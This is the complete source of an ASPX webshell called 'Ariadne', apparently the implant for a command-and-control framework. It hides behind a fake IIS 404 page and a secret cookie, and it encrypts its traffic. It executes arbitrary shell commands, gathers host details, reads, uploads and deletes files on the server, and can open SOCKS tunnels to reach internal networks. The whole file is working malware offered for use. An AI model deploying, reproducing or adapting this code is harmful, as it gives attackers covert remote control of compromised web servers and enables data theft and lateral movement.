<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>
<%@ Import Namespace="System.Xml" %>
<script runat="server">
// Ariadne ASPX webshell template
// Tokens replaced at build time.

static string ARIADNE_UUID = "29a57655-84ae-4eb9-95e3-bf9ea719034d";
static string ARIADNE_AUTH_METHOD = "cookie";
static string ARIADNE_AUTH_NAME = "ARIADNE_SID";
static string ARIADNE_AUTH_VALUE = "ariadne-aspx-final";
static string ARIADNE_ENCODING = "deformed_base64";
static string ARIADNE_DEFORMED_ALPHABET = "0zwP4jRmq/eFSxIJEv9s5tGYC72gTVLkN3i1Zlr86yHDaopuMnAOUd+bcKfQhBWX";
static string ARIADNE_STANDARD_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static string ARIADNE_ENCRYPTION = "aes256_cbc";
static string ARIADNE_AES_KEY = "evgHKlXNcqS+uGwuH4aBxLyOxnObmR3g7iMgqzBKt0M=";
static string ARIADNE_REQUEST_TEMPLATE = "form_post";
static string ARIADNE_REQUEST_PARAM = "data";
static string ARIADNE_CAMOUFLAGE_HTML = "<!DOCTYPE html>\n<html>\n<head><title>404 - File or directory not found.</title>\n<style>body{font-family:\"Segoe UI\",Tahoma,Arial,sans-serif;margin:0;background:#eee}\n.container{max-width:800px;margin:50px auto;background:#fff;border:1px solid #ddd;padding:40px}\nh1{color:#c00;font-size:24px;border-bottom:1px solid #ccc;padding-bottom:10px}\nh2{color:#555;font-size:16px;font-weight:normal}\np{color:#777;font-size:13px;line-height:1.6}</style></head>\n<body><div class=\"container\">\n<h1>Server Error</h1>\n<h2>404 - File or directory not found.</h2>\n<p>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>\n</div></body></html>\n";
static int    ARIADNE_RESPONSE_STATUS = 200;
static string ARIADNE_RESPONSE_CT = "text/html";
static bool   ARIADNE_ENABLE_SOCKS = false;
static bool   ARIADNE_ENABLE_P2P_HTTP = false;
static bool   ARIADNE_ENABLE_P2P_TCP = false;
static int    ARIADNE_TCP_PORT = 7443;
static bool   ARIADNE_DEBUG = true;

// --- Session state for SOCKS tunnels (static so it survives across requests) ---
static Dictionary<string, TcpClient> _tunnelClients = new Dictionary<string, TcpClient>();
static Dictionary<string, NetworkStream> _tunnelStreams = new Dictionary<string, NetworkStream>();
static object _tunnelLock = new object();

// --- P2P message queue (file-based, keyed by MD5 of UUID) ---
static string GetP2PQueueFile()
{
    using (var md5 = MD5.Create())
    {
        byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(ARIADNE_UUID));
        string hex = BitConverter.ToString(hash).Replace("-", "").ToLower();
        return Path.Combine(Path.GetTempPath(), ".ariadne_p2p_" + hex);
    }
}

// =============================================================================
// ENCODING / DECODING
// =============================================================================

static string AriadneEncode(byte[] data)
{
    if (ARIADNE_ENCODING == "deformed_base64")
    {
        string standard = Convert.ToBase64String(data);
        return TranslateChars(standard, ARIADNE_STANDARD_ALPHABET, ARIADNE_DEFORMED_ALPHABET);
    }
    else if (ARIADNE_ENCODING == "standard_base64")
    {
        return Convert.ToBase64String(data);
    }
    else if (ARIADNE_ENCODING == "hex")
    {
        StringBuilder sb = new StringBuilder(data.Length * 2);
        foreach (byte b in data)
            sb.Append(b.ToString("x2"));
        return sb.ToString();
    }
    return Convert.ToBase64String(data);
}

static byte[] AriadneDecode(string encoded)
{
    if (ARIADNE_ENCODING == "deformed_base64")
    {
        string standard = TranslateChars(encoded, ARIADNE_DEFORMED_ALPHABET, ARIADNE_STANDARD_ALPHABET);
        return Convert.FromBase64String(standard);
    }
    else if (ARIADNE_ENCODING == "standard_base64")
    {
        return Convert.FromBase64String(encoded);
    }
    else if (ARIADNE_ENCODING == "hex")
    {
        byte[] bytes = new byte[encoded.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
            bytes[i] = Convert.ToByte(encoded.Substring(i * 2, 2), 16);
        return bytes;
    }
    return Convert.FromBase64String(encoded);
}

static string TranslateChars(string input, string from, string to)
{
    char[] result = input.ToCharArray();
    for (int i = 0; i < result.Length; i++)
    {
        int idx = from.IndexOf(result[i]);
        if (idx >= 0)
            result[i] = to[idx];
    }
    return new string(result);
}

// =============================================================================
// ENCRYPTION / DECRYPTION
// =============================================================================

static byte[] AriadneEncrypt(string plaintext)
{
    byte[] ptBytes = Encoding.UTF8.GetBytes(plaintext);

    if (ARIADNE_ENCRYPTION != "aes256_cbc" || string.IsNullOrEmpty(ARIADNE_AES_KEY))
        return ptBytes;

    byte[] key = Convert.FromBase64String(ARIADNE_AES_KEY);

    byte[] iv = new byte[16];
    using (var rng = new RNGCryptoServiceProvider())
        rng.GetBytes(iv);

    byte[] ciphertext;
    using (var aes = new RijndaelManaged())
    {
        aes.KeySize = 256;
        aes.BlockSize = 128;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = key;
        aes.IV = iv;

        using (var encryptor = aes.CreateEncryptor())
            ciphertext = encryptor.TransformFinalBlock(ptBytes, 0, ptBytes.Length);
    }

    // blob = IV(16) || ciphertext
    byte[] blob = new byte[iv.Length + ciphertext.Length];
    System.Buffer.BlockCopy(iv, 0, blob, 0, iv.Length);
    System.Buffer.BlockCopy(ciphertext, 0, blob, iv.Length, ciphertext.Length);

    // HMAC-SHA256 over blob
    byte[] hmac;
    using (var hmacSha256 = new HMACSHA256(key))
        hmac = hmacSha256.ComputeHash(blob);

    // result = blob || HMAC(32)
    byte[] result = new byte[blob.Length + hmac.Length];
    System.Buffer.BlockCopy(blob, 0, result, 0, blob.Length);
    System.Buffer.BlockCopy(hmac, 0, result, blob.Length, hmac.Length);

    return result;
}

static string AriadneDecrypt(byte[] data)
{
    if (ARIADNE_ENCRYPTION != "aes256_cbc" || string.IsNullOrEmpty(ARIADNE_AES_KEY))
        return Encoding.UTF8.GetString(data);

    byte[] key = Convert.FromBase64String(ARIADNE_AES_KEY);

    if (data.Length < 48) // minimum: 16 IV + 16 block + 16 HMAC (but HMAC is 32)
        return null;

    // Split: blob = data[0..-32], hmac_received = data[-32..]
    int blobLen = data.Length - 32;
    byte[] ivAndCt = new byte[blobLen];
    byte[] hmacReceived = new byte[32];
    System.Buffer.BlockCopy(data, 0, ivAndCt, 0, blobLen);
    System.Buffer.BlockCopy(data, blobLen, hmacReceived, 0, 32);

    // Verify HMAC
    byte[] hmacComputed;
    using (var hmacSha256 = new HMACSHA256(key))
        hmacComputed = hmacSha256.ComputeHash(ivAndCt);

    if (!ConstantTimeEquals(hmacComputed, hmacReceived))
        return null;

    // Decrypt
    byte[] iv = new byte[16];
    byte[] ciphertext = new byte[blobLen - 16];
    System.Buffer.BlockCopy(ivAndCt, 0, iv, 0, 16);
    System.Buffer.BlockCopy(ivAndCt, 16, ciphertext, 0, ciphertext.Length);

    byte[] plaintext;
    using (var aes = new RijndaelManaged())
    {
        aes.KeySize = 256;
        aes.BlockSize = 128;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = key;
        aes.IV = iv;

        using (var decryptor = aes.CreateDecryptor())
            plaintext = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);
    }

    return Encoding.UTF8.GetString(plaintext);
}

// =============================================================================
// CONSTANT-TIME COMPARISON
// =============================================================================

static bool ConstantTimeEquals(byte[] a, byte[] b)
{
    if (a.Length != b.Length) return false;
    int diff = 0;
    for (int i = 0; i < a.Length; i++)
        diff |= a[i] ^ b[i];
    return diff == 0;
}

static bool ConstantTimeEquals(string a, string b)
{
    if (a.Length != b.Length) return false;
    int diff = 0;
    for (int i = 0; i < a.Length; i++)
        diff |= (int)a[i] ^ (int)b[i];
    return diff == 0;
}

// =============================================================================
// AUTHENTICATION
// =============================================================================

bool AriadneAuthenticate()
{
    string value = "";

    if (ARIADNE_AUTH_METHOD == "cookie")
    {
        HttpCookie cookie = Request.Cookies[ARIADNE_AUTH_NAME];
        if (cookie != null)
            value = cookie.Value;
    }
    else if (ARIADNE_AUTH_METHOD == "header")
    {
        value = Request.Headers[ARIADNE_AUTH_NAME] ?? "";
    }
    else if (ARIADNE_AUTH_METHOD == "parameter")
    {
        value = Request.Form[ARIADNE_AUTH_NAME] ?? "";
        if (string.IsNullOrEmpty(value))
            value = Request.QueryString[ARIADNE_AUTH_NAME] ?? "";
    }

    return ConstantTimeEquals(ARIADNE_AUTH_VALUE, value);
}

// =============================================================================
// REQUEST BODY EXTRACTION
// =============================================================================

string AriadneExtractPayload()
{
    if (ARIADNE_REQUEST_TEMPLATE == "form_post")
    {
        return Request.Form[ARIADNE_REQUEST_PARAM] ?? "";
    }
    else if (ARIADNE_REQUEST_TEMPLATE == "json_api")
    {
        string body;
        using (var reader = new StreamReader(Request.InputStream, Encoding.UTF8))
            body = reader.ReadToEnd();

        try
        {
            var serializer = new JavaScriptSerializer();
            var dict = serializer.Deserialize<Dictionary<string, object>>(body);
            if (dict != null && dict.ContainsKey(ARIADNE_REQUEST_PARAM))
                return dict[ARIADNE_REQUEST_PARAM].ToString();
        }
        catch { }
        return "";
    }
    else if (ARIADNE_REQUEST_TEMPLATE == "image_data")
    {
        string val = Request.Form[ARIADNE_REQUEST_PARAM] ?? "";
        string prefix = "data:image/png;base64,";
        if (val.StartsWith(prefix))
            return val.Substring(prefix.Length);
        return val;
    }
    else if (ARIADNE_REQUEST_TEMPLATE == "xml_soap")
    {
        string body;
        using (var reader = new StreamReader(Request.InputStream, Encoding.UTF8))
            body = reader.ReadToEnd();

        try
        {
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(body);
            XmlNamespaceManager nsm = new XmlNamespaceManager(doc.NameTable);
            // Try common SOAP namespace prefixes
            nsm.AddNamespace("soap", "http://schemas.xmlsoap.org/soap/envelope/");
            nsm.AddNamespace("soap12", "http://www.w3.org/2003/05/soap-envelope");

            XmlNode soapBody = doc.SelectSingleNode("//soap:Body", nsm);
            if (soapBody == null)
                soapBody = doc.SelectSingleNode("//soap12:Body", nsm);
            if (soapBody == null)
            {
                // Fallback: find Body element in any namespace
                XmlNodeList bodyNodes = doc.GetElementsByTagName("Body");
                if (bodyNodes.Count > 0)
                    soapBody = bodyNodes[0];
            }

            if (soapBody != null)
            {
                foreach (XmlNode child in soapBody.ChildNodes)
                {
                    if (child.LocalName == ARIADNE_REQUEST_PARAM)
                        return child.InnerText;
                }
            }
        }
        catch { }
        return "";
    }

    // Default: raw body
    using (var reader = new StreamReader(Request.InputStream, Encoding.UTF8))
        return reader.ReadToEnd();
}

// =============================================================================
// COMMAND HANDLERS
// =============================================================================

string CmdCheckin(string taskId)
{
    string hostname = Environment.MachineName;
    string os = Environment.OSVersion.ToString();
    string user = Environment.UserName;
    string domain = Environment.UserDomainName;
    int pid = Process.GetCurrentProcess().Id;
    string arch = Environment.Is64BitOperatingSystem ? "x86_64" : "x86";
    string cwd = Directory.GetCurrentDirectory();

    string ips = "";
    try
    {
        var host = Dns.GetHostEntry(Dns.GetHostName());
        List<string> ipList = new List<string>();
        foreach (var addr in host.AddressList)
        {
            if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork ||
                addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6)
                ipList.Add(addr.ToString());
        }
        ips = string.Join(",", ipList.ToArray());
    }
    catch { }

    return string.Format("0|{0}|{1}|{2}|{3}|{4}|{5}|{6}|{7}|{8}",
        taskId, hostname, os, user, domain, pid, arch, cwd, ips);
}

string CmdShell(string taskId, string command)
{
    try
    {
        bool isWindows = Environment.OSVersion.Platform != PlatformID.Unix &&
                         Environment.OSVersion.Platform != PlatformID.MacOSX;

        ProcessStartInfo psi = new ProcessStartInfo();
        if (isWindows)
        {
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + command;
        }
        else
        {
            psi.FileName = "/bin/sh";
            psi.Arguments = "-c \"" + command.Replace("\\", "\\\\").Replace("\"", "\\\"") + "\"";
        }

        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.CreateNoWindow = true;

        using (Process proc = Process.Start(psi))
        {
            string stdout = proc.StandardOutput.ReadToEnd();
            string stderr = proc.StandardError.ReadToEnd();
            proc.WaitForExit();

            string output = stdout;
            if (!string.IsNullOrEmpty(stderr))
                output += "\n" + stderr;

            return "0|" + taskId + "|" + output.TrimEnd('\r', '\n');
        }
    }
    catch (Exception ex)
    {
        return "1|" + taskId + "|" + ex.Message;
    }
}

string CmdLs(string taskId, string path)
{
    if (!Directory.Exists(path))
        return "1|" + taskId + "|Not a directory: " + path;

    try
    {
        DirectoryInfo dirInfo = new DirectoryInfo(path);
        FileSystemInfo[] entries = dirInfo.GetFileSystemInfos();

        var files = new List<Dictionary<string, object>>();
        foreach (var entry in entries)
        {
            var item = new Dictionary<string, object>();
            item["name"] = entry.Name;
            bool isFile = (entry.Attributes & FileAttributes.Directory) == 0;
            item["is_file"] = isFile;
            item["size"] = isFile ? ((FileInfo)entry).Length : 0;
            item["permissions"] = entry.Attributes.ToString();
            item["modify_time"] = entry.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");
            files.Add(item);
        }

        var result = new Dictionary<string, object>();
        result["host"] = Environment.MachineName;
        result["parent_path"] = dirInfo.FullName;
        result["files"] = files;

        var serializer = new JavaScriptSerializer();
        serializer.MaxJsonLength = int.MaxValue;
        return "0|" + taskId + "|" + serializer.Serialize(result);
    }
    catch (Exception ex)
    {
        return "1|" + taskId + "|Cannot read directory: " + path + " - " + ex.Message;
    }
}

string CmdCd(string taskId, string path)
{
    try
    {
        Directory.SetCurrentDirectory(path);
        return "0|" + taskId + "|" + Directory.GetCurrentDirectory();
    }
    catch
    {
        return "1|" + taskId + "|Cannot change directory to: " + path;
    }
}

string CmdPwd(string taskId)
{
    return "0|" + taskId + "|" + Directory.GetCurrentDirectory();
}

string CmdDownload(string taskId, string filepath)
{
    if (!File.Exists(filepath))
        return "1|" + taskId + "|File not found: " + filepath;

    try
    {
        byte[] contents = File.ReadAllBytes(filepath);
        string encoded = Convert.ToBase64String(contents);
        string filename = Path.GetFileName(filepath);
        string fullpath = Path.GetFullPath(filepath);

        var result = new Dictionary<string, object>();
        result["filename"] = filename;
        result["filepath"] = fullpath;
        result["size"] = contents.Length;
        result["data"] = encoded;

        var serializer = new JavaScriptSerializer();
        serializer.MaxJsonLength = int.MaxValue;
        return "0|" + taskId + "|" + serializer.Serialize(result);
    }
    catch (Exception ex)
    {
        return "1|" + taskId + "|Failed to read file: " + filepath + " - " + ex.Message;
    }
}

string CmdUpload(string taskId, string remotePath, string b64Content)
{
    try
    {
        string dir = Path.GetDirectoryName(remotePath);
        if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
            Directory.CreateDirectory(dir);

        byte[] content = Convert.FromBase64String(b64Content);
        File.WriteAllBytes(remotePath, content);
        return "0|" + taskId + "|Uploaded " + content.Length + " bytes to " + remotePath;
    }
    catch (Exception ex)
    {
        return "1|" + taskId + "|Failed to write file: " + remotePath + " - " + ex.Message;
    }
}

string CmdRm(string taskId, string path)
{
    try
    {
        if (File.Exists(path))
        {
            File.Delete(path);
            return "0|" + taskId + "|Removed: " + path;
        }
        else if (Directory.Exists(path))
        {
            Directory.Delete(path, true);
            return "0|" + taskId + "|Removed: " + path;
        }
        else
        {
            return "1|" + taskId + "|Path not found: " + path;
        }
    }
    catch (Exception ex)
    {
        return "1|" + taskId + "|Failed to remove: " + path + " - " + ex.Message;
    }
}

// =============================================================================
// SOCKS TUNNEL HANDLERS
// =============================================================================

string TunnelConnect(string mark, string data)
{
    try
    {
        string target = Encoding.UTF8.GetString(Convert.FromBase64String(data));
        string[] parts = target.Split(new char[] { ':' }, 2);
        if (parts.Length != 2)
            return "1|Connection target invalid";

        string ip = parts[0];
        int port = int.Parse(parts[1]);

        TcpClient client = new TcpClient();
        client.Connect(ip, port);
        NetworkStream stream = client.GetStream();
        stream.ReadTimeout = 100;

        lock (_tunnelLock)
        {
            _tunnelClients[mark] = client;
            _tunnelStreams[mark] = stream;
        }

        return "0|Connected";
    }
    catch (Exception ex)
    {
        return "1|Connection failed: " + ex.Message;
    }
}

string TunnelForward(string mark, string data)
{
    lock (_tunnelLock)
    {
        if (!_tunnelStreams.ContainsKey(mark))
            return "1|No tunnel session: " + mark;

        try
        {
            byte[] raw = Convert.FromBase64String(data);
            NetworkStream stream = _tunnelStreams[mark];

            if (!_tunnelClients[mark].Connected)
            {
                CleanupTunnel(mark);
                return "1|Tunnel closed";
            }

            stream.Write(raw, 0, raw.Length);
            return "0|" + raw.Length;
        }
        catch (Exception)
        {
            CleanupTunnel(mark);
            return "1|Write failed";
        }
    }
}

string TunnelRead(string mark)
{
    lock (_tunnelLock)
    {
        if (!_tunnelStreams.ContainsKey(mark))
            return "1|No tunnel session: " + mark;

        try
        {
            NetworkStream stream = _tunnelStreams[mark];
            TcpClient client = _tunnelClients[mark];

            List<byte> allData = new List<byte>();
            byte[] buffer = new byte[8192];

            while (stream.DataAvailable)
            {
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead == 0) break;
                byte[] chunk = new byte[bytesRead];
                System.Buffer.BlockCopy(buffer, 0, chunk, 0, bytesRead);
                allData.AddRange(chunk);
                if (allData.Count >= 524288) break;
            }

            string encoded = Convert.ToBase64String(allData.ToArray());

            if (!client.Connected)
            {
                CleanupTunnel(mark);
            }

            return "0|" + encoded;
        }
        catch (Exception)
        {
            CleanupTunnel(mark);
            return "1|Tunnel closed";
        }
    }
}

string TunnelDisconnect(string mark)
{
    lock (_tunnelLock)
    {
        CleanupTunnel(mark);
    }
    return "0|Disconnected";
}

static void CleanupTunnel(string mark)
{
    // Caller must hold _tunnelLock
    if (_tunnelStreams.ContainsKey(mark))
    {
        try { _tunnelStreams[mark].Close(); } catch { }
        _tunnelStreams.Remove(mark);
    }
    if (_tunnelClients.ContainsKey(mark))
    {
        try { _tunnelClients[mark].Close(); } catch { }
        _tunnelClients.Remove(mark);
    }
}

// =============================================================================
// P2P MESSAGE QUEUE
// =============================================================================

static void P2PQueuePush(string message)
{
    string queueFile = GetP2PQueueFile();
    // Use a lock file for concurrency safety
    for (int i = 0; i < 3; i++)
    {
        try
        {
            File.AppendAllText(queueFile, message + "\n");
            return;
        }
        catch (IOException)
        {
            Thread.Sleep(50);
        }
    }
}

static string P2PQueueDrain()
{
    string queueFile = GetP2PQueueFile();
    if (!File.Exists(queueFile))
        return "";

    try
    {
        string data = File.ReadAllText(queueFile);
        File.WriteAllText(queueFile, "");
        return data.Trim();
    }
    catch
    {
        return "";
    }
}

// =============================================================================
// MAIN DISPATCH
// =============================================================================

protected void Page_Load(object sender, EventArgs e)
{
    // Authentication check
    if (!AriadneAuthenticate())
    {
        Response.StatusCode = (ARIADNE_RESPONSE_STATUS == 200) ? 404 : ARIADNE_RESPONSE_STATUS;
        Response.Write(ARIADNE_CAMOUFLAGE_HTML);
        Response.End();
        return;
    }

    // Extract payload
    string encodedPayload = AriadneExtractPayload();
    if (string.IsNullOrEmpty(encodedPayload))
    {
        Response.StatusCode = ARIADNE_RESPONSE_STATUS;
        Response.ContentType = ARIADNE_RESPONSE_CT;
        Response.Write(ARIADNE_CAMOUFLAGE_HTML);
        Response.End();
        return;
    }

    // Decode
    byte[] raw = AriadneDecode(encodedPayload);

    // Decrypt
    string plaintext = AriadneDecrypt(raw);
    if (plaintext == null)
    {
        Response.StatusCode = 500;
        Response.End();
        return;
    }

    // Parse pipe-delimited command
    string[] parts = plaintext.Split('|');
    string action = parts.Length > 0 ? parts[0] : "";
    string taskId = parts.Length > 1 ? parts[1] : "";

    string response = "";

    switch (action)
    {
        case "checkin":
            response = CmdCheckin(taskId);
            break;

        case "shell":
            {
                string command = "";
                if (parts.Length > 2)
                {
                    string[] cmdParts = new string[parts.Length - 2];
                    Array.Copy(parts, 2, cmdParts, 0, cmdParts.Length);
                    command = string.Join("|", cmdParts);
                }
                response = CmdShell(taskId, command);
            }
            break;

        case "ls":
            {
                string path = parts.Length > 2 ? parts[2] : ".";
                response = CmdLs(taskId, path);
            }
            break;

        case "cd":
            {
                string path = parts.Length > 2 ? parts[2] : ".";
                response = CmdCd(taskId, path);
            }
            break;

        case "pwd":
            response = CmdPwd(taskId);
            break;

        case "download":
            {
                string filepath = parts.Length > 2 ? parts[2] : "";
                response = CmdDownload(taskId, filepath);
            }
            break;

        case "upload":
            {
                string remotePath = parts.Length > 2 ? parts[2] : "";
                string b64Content = parts.Length > 3 ? parts[3] : "";
                response = CmdUpload(taskId, remotePath, b64Content);
            }
            break;

        case "rm":
            {
                string path = parts.Length > 2 ? parts[2] : "";
                response = CmdRm(taskId, path);
            }
            break;

        case "tunnel":
            if (ARIADNE_ENABLE_SOCKS)
            {
                string mark = parts.Length > 1 ? parts[1] : "";
                string tunnelCmd = parts.Length > 2 ? parts[2] : "";
                string tunnelData = parts.Length > 3 ? parts[3] : "";
                switch (tunnelCmd)
                {
                    case "CONNECT":
                        response = TunnelConnect(mark, tunnelData);
                        break;
                    case "FORWARD":
                        response = TunnelForward(mark, tunnelData);
                        break;
                    case "READ":
                        response = TunnelRead(mark);
                        break;
                    case "DISCONNECT":
                        response = TunnelDisconnect(mark);
                        break;
                    default:
                        response = "1|Unknown tunnel command: " + tunnelCmd;
                        break;
                }
            }
            else
            {
                response = "1|SOCKS tunneling not enabled";
            }
            break;

        case "poll":
        case "poll_p2p":
            {
                string p2pData = "";
                if (ARIADNE_ENABLE_P2P_HTTP && action == "poll_p2p")
                    p2pData = P2PQueueDrain();
                response = "0|poll|" + p2pData;
            }
            break;

        default:
            response = "1|" + taskId + "|Unknown action: " + action;
            break;
    }

    // Encrypt response
    byte[] encrypted = AriadneEncrypt(response);

    // Encode response
    string encodedResponse = AriadneEncode(encrypted);

    // Output
    Response.StatusCode = ARIADNE_RESPONSE_STATUS;
    Response.ContentType = ARIADNE_RESPONSE_CT;
    Response.Write("<span id=\"r\">" + encodedResponse + "</span>");
    Response.End();
}
</script>
